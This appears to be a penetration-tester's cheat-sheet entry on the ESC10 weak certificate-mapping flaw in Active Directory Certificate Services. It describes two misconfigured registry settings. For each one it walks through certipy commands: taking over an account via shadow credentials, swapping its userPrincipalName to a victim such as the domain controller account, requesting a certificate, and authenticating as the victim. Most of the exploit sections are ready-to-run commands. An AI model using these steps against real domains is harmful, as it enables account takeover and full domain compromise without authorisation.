# ESC10 - Weak certificate mapping ⚙️
This ESC refers to a weak configuration of the registry keys

**Case 1 - Explication**


*   `StrongCertificateBindingEnforcement` set to `0`, meaning no strong mapping is performed
*   A template that specifiy client authentication is enabled (any template, like the built-in `User` template)
*   `GenericWrite` right against any account A to compromise any account B

> At the time of writting (06/08/2022), there is no solution as a low privileged user to read the `StrongCertificateBindingEnforcement` value. It is worth to try the attack hopping the key is misconfigured.

**Case 2 - Explication**

*   `CertificateMappingMethods` is set to `0x4`, meaning no strong mapping is performed and only the UPN will be checked
*   A template that specifiy client authentication is enabled (any template, like the built-in `User` template)
*   `GenericWrite` right against any account A to compromise any account B without a UPN already set (machine accounts or buit-in Administrator account for example)


### Exploit case 1
---------------------

**user1** ==(GenericWrite)=> **user2** ==(want to compromise)=> **user3**

1/ Obtain **user2**'s hash (shadow credentials for ex.) :

```text-plain
certipy shadow auto -username "user1@$DOMAIN" -p "$PASSWORD" -account user2
```

2/  Change the **user2**'s `userPrincipalName` to **user3**.

```text-plain
certipy account update -username "user1@$DOMAIN" -p "$PASSWORD" -user user2 -upn user3
```

3/ Ask for a certificate allowing client authentication as user2 :

```text-plain
certipy req -username "user2@$DOMAIN" -hash "$NT_HASH" -ca 'ca_name' -template 'User'
```

4/ Reverse the user2's UPN :

```text-plain
certipy account update -username "user1@$DOMAIN" -p "$PASSWORD" -user user2 -upn "user2@$DOMAIN"
```

5/ Auth with the certif as User3

### Exploit case 2
--------------------

user1** ==(GenericWrite)=> **user2** ==(want to compromise)=> **DC$** 

1/ Obtain **user2**'s hash (shadow credentials for ex.) :

```text-plain
certipy shadow auto -username "user1@$DOMAIN" -p "$PASSWORD" -account user2
```

2/  Change the **user2**'s `userPrincipalName` to **DC$** .

```text-plain
certipy account update -username "user1@$DOMAIN" -p "$PASSWORD" -user user2 -upn DC\$@domain.local
```

3/ Ask for a certificate allowing client authentication as user2 :

```text-plain
certipy req -username "user2@$DOMAIN" -hash "$NT_HASH" -ca 'ca_name' -template 'User'
```

4/ Reverse the user2's UPN :

```text-plain
certipy account update -username "user1@$DOMAIN" -p "$PASSWORD" -user user2 -upn "user2@$DOMAIN"
```

5/ Auth with the certif as DC$

### More information
https://www.thehacker.recipes/ad/movement/ad-cs/certificate-templates#certificate-mapping
